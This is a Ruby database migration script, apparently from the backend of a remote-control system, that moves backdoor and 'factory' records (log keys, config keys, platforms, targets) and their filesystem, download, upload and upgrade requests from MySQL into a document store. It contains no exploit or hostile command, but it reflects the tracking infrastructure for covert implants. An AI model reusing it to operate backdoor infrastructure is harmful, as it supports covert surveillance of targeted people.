require 'rcs-db/db_layer'
require 'rcs-db/grid'

module RCS
module DB

class BackdoorMigration
  extend Tracer
  
  def self.migrate(verbose)
  
    print "Migrating backdoors "

    backdoors = DB.instance.mysql_query('SELECT * from `backdoor` ORDER BY `backdoor_id`;').to_a
    backdoors.each do |backdoor|

      trace :info, "Migrating backdoor '#{backdoor[:backdoor]}'." if verbose
      print "." unless verbose
      
      # is this a backdoor or a factory?!?!
      kind = (backdoor[:class] == 0) ? 'backdoor' : 'factory'
      
      # skip item if already migrated
      next if Item.count(conditions: {_mid: backdoor[:backdoor_id], _kind: kind}) != 0
      
      mb = ::Item.new
      mb[:_mid] = backdoor[:backdoor_id]
      mb.name = backdoor[:backdoor]
      mb.desc = backdoor[:desc]
      mb._kind = kind
      mb.status = backdoor[:status].downcase
      
      mb.build = backdoor[:build]
      
      mb.instance = backdoor[:instance] if kind == 'backdoor'
      mb.version = backdoor[:version] if kind == 'backdoor'
      
      mb.logkey = backdoor[:logkey]
      mb.confkey = backdoor[:confkey]
      mb.type = backdoor[:type].downcase
      
      if kind == 'backdoor'
        mb.platform = backdoor[:subtype].downcase
        mb.platform = 'windows' if ['win32', 'win64'].include? mb.platform
      end
      
      mb.deleted = (backdoor[:deleted] == 0) ? false : true
      mb.uninstalled = (backdoor[:uninstalled] == 0) ? false : true if kind == 'backdoor'
      
      mb.counter = backdoor[:counter] if kind == 'factory'
      
      mb.pathseed = backdoor[:pathseed]
      
      target = Item.where({_mid: backdoor[:target_id], _kind: 'target'}).first
      mb._path = target[:_path] + [ target[:_id] ]
      
      mb.save
      
    end
    
    puts " done."
    
  end

  def self.migrate_associations(verbose)
    # filesystems
    
    print "Migrating filesystems "
    
    filesystems = DB.instance.mysql_query('SELECT * from `filesystem` ORDER BY `filesystem_id`;').to_a
    filesystems.each do |fs|
      backdoor = Item.where({_mid: fs[:backdoor_id], _kind: 'backdoor'}).first
      begin
        backdoor.filesystem_requests.create!(path: fs[:path], depth: fs[:depth])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end
    
    puts " done."
    
    # downloads

    print "Migrating downloads "

    downloads = DB.instance.mysql_query('SELECT * from `download` ORDER BY `download_id`;').to_a
    downloads.each do |dw|
      backdoor = Item.where({_mid: dw[:backdoor_id], _kind: 'backdoor'}).first
      begin
        backdoor.download_requests.create!(path: dw[:filename])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end

    puts " done."

    # upgrades

    print "Migrating upgrades "

    upgrades = DB.instance.mysql_query('SELECT * from `upgrade` ORDER BY `upgrade_id`;').to_a
    upgrades.each do |ug|
      backdoor = Item.where({_mid: ug[:backdoor_id], _kind: 'backdoor'}).first
      begin
        upgrade = backdoor.upgrade_requests.create!(filename: ug[:filename])
        upgrade[:_grid] = GridFS.instance.put(upgrade[:_id].to_s, ug[:content]).to_s
        upgrade.save

        puts GridFS.instance.get_by_filename(upgrade[:_id].to_s).inspect
        
      rescue Mongoid::Errors::Validations => e
        next
      end
      
      print "." unless verbose
    end
    
    puts " done."
    
    # uploads
    
    print "Migrating uploads "

    uplodas = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
    uplodas.each do |up|
      backdoor = Item.where({_mid: up[:backdoor_id], _kind: 'backdoor'}).first
      begin
        upload = backdoor.upload_requests.create!(filename: up[:filename])
        upload[:_grid] = GridFS.instance.put(upload[:_id].to_s, up[:content]).to_s
        upload.save

        puts GridFS.instance.get_by_filename(upload[:_id].to_s).inspect
        
      rescue Mongoid::Errors::Validations => e
        next
      end
      
      print "." unless verbose
    end
    
    puts " done."

  end
end

end # ::DB
end # ::RCS
